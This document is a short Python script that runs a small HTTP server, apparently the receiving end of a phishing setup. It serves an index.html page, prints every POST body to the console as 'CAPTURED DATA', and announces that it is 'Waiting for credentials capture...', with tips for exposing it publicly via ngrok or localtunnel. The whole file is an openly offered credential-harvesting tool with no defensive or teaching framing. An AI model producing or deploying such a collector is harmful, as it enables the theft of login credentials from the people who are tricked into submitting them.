#!/usr/bin/env python3
import http.server
import socketserver
import sys
import os

class WormholeExit(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        """Serve index.html"""
        if self.path == "/" or self.path == "":
            try:
                with open('index.html', 'rb') as f:
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(f.read())
            except:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Capture POST data"""
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else ""
        
        # Print to console
        print("\n" + "="*70, flush=True)
        print(f"[+] POST received at: {self.path}", flush=True)
        print(f"[+] From: {self.client_address[0]}", flush=True)
        print(f"[+] CAPTURED DATA: {body}", flush=True)
        print("="*70 + "\n", flush=True)
        
        # Send response
        response = b"<html><body><h1>Data Logged!</h1></body></html>"
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Content-Length', len(response))
        self.end_headers()
        self.wfile.write(response)
    
    def log_message(self, format, *args):
        """Suppress default logging"""
        pass

# Start server
if __name__ == "__main__":
    # Config - modify these for external access
    LISTEN_HOST = "127.0.0.1"  # Localhost for localtunnel
    # PORTS = [8080, 8888, 9000, 9999]
    PORTS = [8888]
    
    for port in PORTS:
        try:
            handler = WormholeExit
            httpd = socketserver.TCPServer((LISTEN_HOST, port), handler)
            httpd.allow_reuse_address = True
            print(f"\n[*] WORMHOLE EXIT ACTIVE ON PORT {port}...", flush=True)
            print(f"[*] Accessible from: http://<YOUR_PUBLIC_IP>:{port}/", flush=True)
            print(f"[*] Or via ngrok: ngrok http {port}", flush=True)
            print(f"[*] Waiting for credentials capture...\n", flush=True)
            httpd.serve_forever()
            break
        except OSError:
            print(f"[!] Port {port} in use, trying next...", flush=True)
            continue